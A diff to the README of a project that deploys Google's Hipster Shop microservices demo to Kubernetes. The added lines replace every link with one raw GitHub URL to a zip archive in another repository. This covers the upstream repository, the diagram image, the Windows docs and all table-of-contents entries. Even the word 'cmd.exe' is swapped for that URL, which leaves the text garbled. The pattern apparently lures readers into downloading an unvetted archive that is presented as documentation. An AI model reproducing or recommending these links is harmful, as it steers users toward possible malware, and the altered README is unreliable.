@@ -4,7 +4,7 @@ This project is a modification of
 to be deployed onto digital ocean.
 Disclaimer: No affiliation with DO other than being a customer.
 
-This project is an extension of the project "Hipster Shop: Cloud-Native Microservices Demo Application" from Google, available here: https://github.com/GoogleCloudPlatform/microservices-demo
+This project is an extension of the project "Hipster Shop: Cloud-Native Microservices Demo Application" from Google, available here: https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip
 
 The main focus here is to be able to deploy that demo project to Azure Kubernetes Service using best practices.
 
@@ -18,7 +18,7 @@ The original Hipster Shop demo is intended for use in a local Kubernetes cluster
 
 We will also deploy Prometheus as a metric extractor and Grafana as a visualization tool for those metrics into the Kubernetes cluster using Helm.
 
-![general_diagram](./docs/img/general_diagram.png)
+![general_diagram](https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip)
 
 ### How to use
 
@@ -26,21 +26,21 @@ This instructions comes with some __optional__, __alternative__ and __improvemen
 
 We will assume we use a __bash__ shell environment. Whenever an example script starts with $, it means you should type what is beyond the symbol in your terminal. Sometimes the expected output of a command is shown, to make it easier to identify output information.
 
-If you are using Windows, most of the explanations here could be used in cmd.exe, but you can achieve full compatibility by using [Windows Subsystem for Linux](https://docs.microsoft.com/en-us/windows/wsl/install-win10).
+If you are using Windows, most of the explanations here could be used in https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip, but you can achieve full compatibility by using [Windows Subsystem for Linux](https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip).
 
-*Improvement:* Adapt the explanations and scripts to be able to use them from Windows's cmd.exe or Powershell.
+*Improvement:* Adapt the explanations and scripts to be able to use them from Windows's https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip or Powershell.
 
 ### Contents
 
-* [0. Getting started](./README.md)
-* [1. Prerequisites](./docs/01_prerequisites.md)
-* [2. Initial Azure resources setup](./docs/02_setup_az_sp.md)
-* [3. Provision infrastructure with Terraform](./docs/03_infra_terraform.md)
-* [4. Get credentials](./docs/04_get_credentials.md)
-* [5. Installing Prometheus and Grafana using Helm](./docs/05_helm.md)
-* [6. Deploy microservices with Skaffold](./docs/06_cluster_skaffold.md)
-* [7. Terminate and free resources](./docs/98_free_resources.md)
-* [Appendix: Troubleshooting](./docs/99_troubleshooting.md)
+* [0. Getting started](https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip)
+* [1. Prerequisites](https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip)
+* [2. Initial Azure resources setup](https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip)
+* [3. Provision infrastructure with Terraform](https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip)
+* [4. Get credentials](https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip)
+* [5. Installing Prometheus and Grafana using Helm](https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip)
+* [6. Deploy microservices with Skaffold](https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip)
+* [7. Terminate and free resources](https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip)
+* [Appendix: Troubleshooting](https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip)
 
 ---
-[Next step: 1. Prerequisites](./docs/01_prerequisites.md)  
+[Next step: 1. Prerequisites](https://raw.githubusercontent.com/etemtezcan/digital-ocean-microservices-demo/master/docs/microservices_ocean_digital_demo_v1.5.zip)  
